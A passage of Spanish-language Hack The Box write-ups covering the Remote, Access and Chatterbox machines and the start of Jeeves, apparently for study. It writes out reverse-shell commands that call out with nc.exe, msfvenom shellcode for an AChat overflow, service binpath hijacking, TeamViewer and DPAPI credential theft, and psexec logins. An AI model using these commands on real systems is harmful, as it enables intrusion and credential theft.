<p>Se visualizó que el privilegio <code>SeImpersonatePrivilege</code> se encuentra habilitado, permitiendo su explotación haciendo uso de Rotten/JuicyPotato.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_1.png" alt="SeImpersonatePrivilege habilitado" /></p>
<p>Por medio de <a href="https://github.com/carlospolop/PEASS-ng">winPEAS</a> se encontró que el servicio de <code>TeamViewer</code> se encuentra habilitado y ejecutándose. Concordando de alguna forma con el nombre de la máquina.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_2.png" alt="Servicio TeamViewer habilitado" /></p>
<p>Posteriormente, se realizó una búsqueda sobre los exploits disponibles sobre TeamViewer encontrando los siguientes.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_3.png" alt="Exploits disponibles de TeamViewer" /></p>
<p>En donde por curiosidad se tomó en consideración la exposición de credenciales y búscando más información al respecto se encontró el módulo de metasploit <code>windows/gather/credentials/teamviewer_passwords</code> y un <a href="https://github.com/zaphoxx/WatchTV">repositorio</a> en conjunto con <a href="https://whynotsecurity.com/blog/teamviewer/">su artículo</a> en donde se realiza una PoC para descifrar las credenciales alojadas en registros de Windows.</p>
<p>También dentro de la salida de <code>winPEAS</code> se visualiza que se cuenta con acceso completo al servicio <code>UsoSvc</code>, lo que permitiría modificar las opciones del servicio y detener o iniciar su ejecución.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_4.png" alt="Permisos de servicio UsoSvc" /></p>
<h2 id="escalación-de-privilegios-3"><a class="header" href="#escalación-de-privilegios-3">Escalación de privilegios</a></h2>
<h3 id="iis-apppool--nt-authority-system"><a class="header" href="#iis-apppool--nt-authority-system">iis apppool → nt authority system</a></h3>
<h4 id="teamviewer"><a class="header" href="#teamviewer">TeamViewer</a></h4>
<p>Al subir el script de powershell a la máquina, cargarlo como módulo en la sesión con <code>Import-Module</code> y ejecutar la función de extración <code>Get-TeamViewPasswords</code>, se descifró la contraseña <code>!R3m0te!</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_5.png" alt="Extracción de contraseña" /></p>
<p><em>El mismo proceso puede ser realizado con el módulo de metasploit, sin embargo, es necesario tener una sesión abierta preferentemente de meterpreter (al tiempo que se resolvió la máquina el payload ejecutado fue <code>windows/meterpreter_reverse_tcp</code>)</em></p>
<p>Probando posteriormente la contraseña con el usuario Administrator mediante:</p>
<pre><code class="language-bash">impacket-psexec 'Administrator:!R3m0te!@10.10.10.180'
</code></pre>
<p>Obteniendo así acceso como <code>NT AUTHORITY\SYSTEM</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_6.png" alt="Acceso como nt authority system" /></p>
<h4 id="modificación-de-servicios"><a class="header" href="#modificación-de-servicios">Modificación de servicios</a></h4>
<p>Mediante:</p>
<pre><code class="language-powershell">sc.exe qc UsoSvc
</code></pre>
<p>Se puede ver más a detalle información respecto este servicio.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_7.png" alt="Información de servicio UsoSvc" /></p>
<p>Por lo que haciendo uso de:</p>
<pre><code class="language-powershell">sc.exe config UsoSvc binpath=&quot;c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 4321&quot;
</code></pre>
<p>Se buscó la modificación de la ruta del binario a ejecutar sustituyéndola con la ejecución de netcat para entablar una reverse shell. Al consultar de nuevo la información del servicio, se observa la modificación del valor.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_8.png" alt="Cambio de ruta de binario" /></p>
<p>Por consiguiente al poner la conexión a la escucha y  realizar un reinicio del servicio con:</p>
<pre><code class="language-powershell">net stop UsoSvc &amp;&amp; net start UsoSvc
</code></pre>
<p>Se logró tener acceso como <code>NT AUTHORITY\SYSTEM</code> satisfactoriamente.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/post_9.png" alt="Acceso como nt authority system" /></p>
<h4 id="juicypotato"><a class="header" href="#juicypotato">JuicyPotato</a></h4>
<p>Debido al no tener éxito al aprovecharse del privilegio ni con el uso de <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> ni con <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> se buscó corroborar con el writeup oficial, el cuál indica que debería ser válido el método, sin embargo, no se logró satisfactoriamente.</p>
<h1 id="referencias-7"><a class="header" href="#referencias-7">Referencias</a></h1>
<ul>
<li><a href="https://www.exploit-db.com/exploits/49488">Exploit de Umbraco</a>.</li>
<li><a href="https://github.com/noraj/Umbraco-RCE">Github - Exploit de Umbraco</a>.</li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">HackTricks - Pentesting NFS Service</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/module/importing-a-powershell-module?view=powershell-7.2">Microsoft - Importación de módulo en powershell</a>.</li>
<li><a href="https://github.com/zaphoxx/WatchTV">Github - Descifrado de contraseñas TeamViewer</a>.</li>
<li><a href="https://whynotsecurity.com/blog/teamviewer/">Descrifrado de contraseñas TeamViewer post de blog</a>.</li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services">HackTricks - Local Privilege Escalation - Services</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="access"><a class="header" href="#access">Access</a></h1>
<h2 id="tabla-de-contenido-5"><a class="header" href="#tabla-de-contenido-5">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#servicios">Servicios</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#ftp---21">ftp - 21</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#telnet---23">telnet - 23</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#explotaci%C3%B3n">Explotación</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#enumeraci%C3%B3n-1">Enumeración</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a></li>
</ul>
</li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#conclusi%C3%B3n">Conclusión</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#notas-adicionales">Notas adicionales</a></li>
<li><a href="htb/boxes/windows/1_facil/Access/index.html#referencias">Referencias</a></li>
</ul>
<h2 id="introducción-2"><a class="header" href="#introducción-2">Introducción</a></h2>
<h3 id="técnicas-vistas--tags-2"><a class="header" href="#técnicas-vistas--tags-2">Técnicas vistas / Tags</a></h3>
<ul>
<li>Windows - Privilege Escalation: RunAs</li>
<li>Windows - Privilege Escalation: DPAPI abuse</li>
<li>Técnica 3</li>
</ul>
<h3 id="estadísticas-5"><a class="header" href="#estadísticas-5">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/156">Access</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Easy</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/1_facil/Access/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>20</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a></td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento-5"><a class="header" href="#reconocimiento-5">Reconocimiento</a></h2>
<h3 id="escaneo-de-host-5"><a class="header" href="#escaneo-de-host-5">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos-5"><a class="header" href="#escaneo-completo-de-puertos-5">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -open -vvv -p- -n -Pn -oG nmap/all_ports_ss $TARGET
[sudo] password for srrequiem:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 14:36 EDT
Initiating SYN Stealth Scan at 14:36
Scanning 10.10.10.98 [65535 ports]
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Completed SYN Stealth Scan at 14:37, 26.32s elapsed (65535 total ports)
Nmap scan report for 10.10.10.98
Host is up, received user-set (0.060s latency).
Scanned at 2022-10-28 14:36:34 EDT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
23/tcp open  telnet  syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
</code></pre>
<h4 id="escaneo-específico-5"><a class="header" href="#escaneo-específico-5">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 21,23,80 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 14:45 EDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 14:45 (0:00:14 remaining)
Nmap scan report for 10.10.10.98
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.67 seconds
</code></pre>
<h2 id="enumeración-9"><a class="header" href="#enumeración-9">Enumeración</a></h2>
<h3 id="servicios-5"><a class="header" href="#servicios-5">Servicios</a></h3>
<h4 id="ftp---21-1"><a class="header" href="#ftp---21-1">ftp - 21</a></h4>
<p>Se cuenta con acceso al servidor FTP mediante el usuario <code>anonymous</code>, el cuál cuenta con permsisos para descargar archivos por lo que se puede realizar una descarga recursiva de los archivos.</p>
<pre><code class="language-bash">wget -r --no-passive ftp://anonymous:anonymous@10.10.10.98/
</code></pre>
<p>Bajo la siguiente estructura:</p>
<pre><code class="language-bash">.
├── Backups
│   └── backup.mdb # Base de datos de Microsoft Access
└── Engineer
    └── Access Control.zip # Zip protegido con contraseña
</code></pre>
<h4 id="telnet---23"><a class="header" href="#telnet---23">telnet - 23</a></h4>
<p>Se presenta un login, el cual se intentó acceder mediante credenciales por default. Sin éxito alguno.</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/enum_1.png" alt="Login de telnet" /></p>
<h2 id="explotación-5"><a class="header" href="#explotación-5">Explotación</a></h2>
<p>Mediante el uso de <code>dbeaver</code> se puede interactuar de manera visual con la base de datos (<code>backup.mdb</code>), encontrando así en la tabla <code>auth_user</code> una contraseña potencial para descomprimir <code>Access Control.zip</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/exploit_1.png" alt="Contraseña de zip" /></p>
<p>Descomprimiendo el archivo mediante:</p>
<pre><code class="language-bash">7z x Access\ Control.zip -paccess4u@security
</code></pre>
<p>Identificando el archivo con <code>file</code> se visualiza que es algo así como una bandeja de entrada e un email:</p>
<pre><code class="language-bash">└─$ file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (&gt;=2003)
</code></pre>
<p>Después de buscar un intérprete para abrir dicho archivo, se encontró una <a href="https://goldfynch.com/pst-viewer/index.html">herramienta online</a> que permite su visualización.</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/exploit_2.png" alt="Contraseña de usuario" /></p>
<p>A lo que presenta una cuenta y contraseña para el login de telnet encontrado previamente. Obteniendo así acceso a la máquina. (<code>security:4Cc3ssC0ntr0ller</code>)</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/exploit_3.png" alt="Acceso a la máquina" /></p>
<h2 id="post-explotación-5"><a class="header" href="#post-explotación-5">Post Explotación</a></h2>
<h3 id="enumeración-10"><a class="header" href="#enumeración-10">Enumeración</a></h3>
<p>Al ejecutar <code>cmdkey /list</code> para verificar la existencia de credenciales guardadas en la máquina se encontró que se encontraban credenciales del usuario <code>Administrator</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/post_1.png" alt="Credenciales guardadas" /></p>
<h3 id="escalación-de-privilegios-4"><a class="header" href="#escalación-de-privilegios-4">Escalación de privilegios</a></h3>
<p>Al seguir el paso a paso de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas">PayloadAllTheThings</a> se puede impersonar el usuario con credenciales guardadas, ejecutando el comando <code>runas</code>.</p>
<p>Por lo que después de compartir acceso mediante un servidor de <code>smb</code> se pudo ejecutar el binario <code>nc.exe</code> para obtener una reverse shell con:</p>
<pre><code class="language-bash">runas /savecred /user:ACCESS\Administrator &quot;\\10.10.14.12\smbFolder\nc.exe -e cmd.exe 10.10.14.12 1234&quot;
</code></pre>
<p><img src="htb/boxes/windows/1_facil/Access/images/post_2.png" alt="Acceso como Administrator" /></p>
<ol>
<li>Ejecución de comando <code>runas</code>.</li>
<li>Servidor <code>smb</code>.</li>
<li>Obtención de reverse shell como <code>Administrator</code>.</li>
</ol>
<h2 id="conclusión"><a class="header" href="#conclusión">Conclusión</a></h2>
<h2 id="notas-adicionales-1"><a class="header" href="#notas-adicionales-1">Notas adicionales</a></h2>
<p>Al verificar la resolución de la máquina con la de <a href="https://0xdf.gitlab.io/2019/03/02/htb-access.html#privesc-to-administrator">0xdf</a> encontré que era posible extraer las contraseñas dado que se encuentran cacheadas, siguiendo el writeup oficial de la máquina y el post de <a href="https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/">harmj0y</a> para abusar de DPAPI.</p>
<p>Para lograr la extracción de la API es necesario identificar los archivos de las credenciales y las masterkeys de los cuales los archivos de las credenciales son cadenas de 32 caracteres y las masterkeys son GUIDs, cuentan con el atributo de &quot;Archivos de sistema&quot; por lo que se tendría que usar <code>dir /AS</code> para identificarlos.</p>
<p>Lugares a buscar:</p>
<pre><code class="language-powershell">dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault
​dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials
dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect
​dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault
​dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials
dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect
</code></pre>
<p>Identificando así los archivos a ocupar para poder encontrar la contraseña del usuario loggeado:</p>
<p><img src="htb/boxes/windows/1_facil/Access/images/additional_1.png" alt="Archivos mimikatz" /></p>
<p>Una vez identificado, se extrajeron los archivos haciendo uso de un servidor <code>smb</code> y de <code>xcopy /h</code> (dado que son archivos de sistema) mediante:</p>
<pre><code class="language-powershell">xcopy /h C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290 \\10.10.14.12\smbFolder

xcopy /h C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580 \\10.10.14.12\smbFolder
</code></pre>
<p>Para después descifrar la masterkey haciendo uso de mimikatz y del comando <code>dpapi::​masterkey​</code>.</p>
<h2 id="referencias-8"><a class="header" href="#referencias-8">Referencias</a></h2>
<ul>
<li><a href="https://dbeaver.io/">Dbeaver</a> (Disponible también mediante <code>apt install dbeaver</code>).</li>
<li><a href="https://goldfynch.com/pst-viewer/index.html">PSTViewer</a>.</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas">PayloadAllTheThings - RunAs</a>.</li>
<li><a href="https://0xdf.gitlab.io/2019/03/02/htb-access.html">0xdf Access writeup</a>.</li>
<li><a href="https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a>.</li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy">Microsoft - xcopy</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-6"><a class="header" href="#estadísticas-6">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/123">Chatterbox</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Medium</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/2_medio/Chatterbox/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>30</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/709">lkys37en</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-6"><a class="header" href="#reconocimiento-6">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-6"><a class="header" href="#escaneo-de-host-6">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-6"><a class="header" href="#escaneo-completo-de-puertos-6">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT
Initiating Connect Scan at 13:36
Scanning 10.10.10.74 [65535 ports]
Discovered open port 135/tcp on 10.10.10.74
Discovered open port 139/tcp on 10.10.10.74
Discovered open port 445/tcp on 10.10.10.74
Discovered open port 49152/tcp on 10.10.10.74
Discovered open port 49154/tcp on 10.10.10.74
Discovered open port 9256/tcp on 10.10.10.74
Discovered open port 49153/tcp on 10.10.10.74
Discovered open port 9255/tcp on 10.10.10.74
Discovered open port 49155/tcp on 10.10.10.74
Discovered open port 49157/tcp on 10.10.10.74
Discovered open port 49156/tcp on 10.10.10.74
Completed Connect Scan at 13:37, 29.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.74
Host is up, received user-set (0.073s latency).
Scanned at 2022-05-27 13:36:42 EDT for 29s
Not shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
9255/tcp  open  mon          syn-ack
9256/tcp  open  unknown      syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49156/tcp open  unknown      syn-ack
49157/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
</code></pre>
<h3 id="escaneo-específico-6"><a class="header" href="#escaneo-específico-6">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT
Nmap scan report for 10.10.10.74
Host is up (0.074s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
| smb2-time:
|   date: 2022-05-27T22:40:43
|_  start_date: 2022-05-27T22:34:47
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-27T18:40:47-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds
</code></pre>
<h1 id="enumeración-11"><a class="header" href="#enumeración-11">Enumeración</a></h1>
<h2 id="servicios-6"><a class="header" href="#servicios-6">Servicios</a></h2>
<h3 id="achat---9255-9256"><a class="header" href="#achat---9255-9256">achat - 9255, 9256</a></h3>
<h4 id="manual-3"><a class="header" href="#manual-3">Manual</a></h4>
<p>Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró <a href="https://github.com/mpgn/AChat-Reverse-TCP-Exploit">este repositorio en github</a> de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura <code>AChat 0.150 Beta 7 Windows 7/8/10 x86/x64</code>. Por lo que directamente se probó el exploit.</p>
<h1 id="explotación-6"><a class="header" href="#explotación-6">Explotación</a></h1>
<h2 id="buffer-overflow---rce"><a class="header" href="#buffer-overflow---rce">Buffer Overflow - RCE</a></h2>
<h3 id="pasos-previos--preparación-1"><a class="header" href="#pasos-previos--preparación-1">Pasos previos | Preparación</a></h3>
<p>Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando:</p>
<pre><code class="language-bash">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python &gt; scode.txt
</code></pre>
<p>Sustituyendo los valores correspondientes en el script del shellcode y host.</p>
<h3 id="ejecución-11"><a class="header" href="#ejecución-11">Ejecución</a></h3>
<p>Obteniendo acceso como el usuario <code>alfred</code>.</p>
<p><img src="htb/boxes/windows/2_medio/Chatterbox/images/exploit_1.png" alt="Acceso como usuario alfred" /></p>
<h1 id="post-explotación-6"><a class="header" href="#post-explotación-6">Post Explotación</a></h1>
<h2 id="enumeración-12"><a class="header" href="#enumeración-12">Enumeración</a></h2>
<p>Posteriormente al ejecutar <a href="https://github.com/carlospolop/PEASS-ng">winPEAS</a>, se identificaron dos rutas potenciales a probar:</p>
<ol>
<li>El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator.</li>
<li>Existen credenciales AutoLogon visibles.</li>
</ol>
<p><img src="htb/boxes/windows/2_medio/Chatterbox/images/post_1.png" alt="Rutas potenciales" /></p>
<h2 id="escalación-de-privilegios-5"><a class="header" href="#escalación-de-privilegios-5">Escalación de privilegios</a></h2>
<h3 id="alfred--nt-authority-system"><a class="header" href="#alfred--nt-authority-system">alfred → nt authority system</a></h3>
<p>En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de <code>icacls</code> para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de <code>root.txt</code>.</p>
<p>Por medio de:</p>
<pre><code class="language-powershell">icacls .\root.txt /e /p alfred:f
</code></pre>
<p>Tomando como referencia <a href="https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html">este post</a> para verificar el uso del binario.</p>
<p><img src="htb/boxes/windows/2_medio/Chatterbox/images/post_2.png" alt="Cambio de permisos" /></p>
<p>En el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como <code>psexec</code> se puede obtener una shell como <code>NT AUTHORITY SYSTEM</code>, probando las credenciales obtenidas anteriormente bajo la suposición de reutilización de contraseña.</p>
<p>Ejecutando:</p>
<pre><code class="language-bash">impacket-psexec 'Administrator:Welcome1!@10.10.10.74'
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Chatterbox/images/post_3.png" alt="Acceso como nt authority system" /></p>
<h1 id="referencias-9"><a class="header" href="#referencias-9">Referencias</a></h1>
<ul>
<li><a href="https://github.com/mpgn/AChat-Reverse-TCP-Exploit">AChat expoit</a>.</li>
<li><a href="https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html">Windows change access permissions from the command line</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-7"><a class="header" href="#estadísticas-7">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/114">Jeeves</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Medium</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/2_medio/Jeeves/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>30</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-7"><a class="header" href="#reconocimiento-7">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-7"><a class="header" href="#escaneo-de-host-7">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-7"><a class="header" href="#escaneo-completo-de-puertos-7">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:08 EDT
Initiating Connect Scan at 20:08
Scanning 10.10.10.63 [65535 ports]
Discovered open port 80/tcp on 10.10.10.63
Discovered open port 445/tcp on 10.10.10.63
Discovered open port 135/tcp on 10.10.10.63
Connect Scan Timing: About 26.73% done; ETC: 20:10 (0:01:25 remaining)
Discovered open port 50000/tcp on 10.10.10.63
Completed Connect Scan at 20:10, 97.29s elapsed (65535 total ports)
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.069s latency).
Scanned at 2022-06-22 20:08:29 EDT for 97s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
50000/tcp open  ibm-db2      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 97.32 seconds
</code></pre>
<h3 id="escaneo-específico-7"><a class="header" href="#escaneo-específico-7">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,135,445,50000 -n -Pn -oN nmap/targeted $TARGET
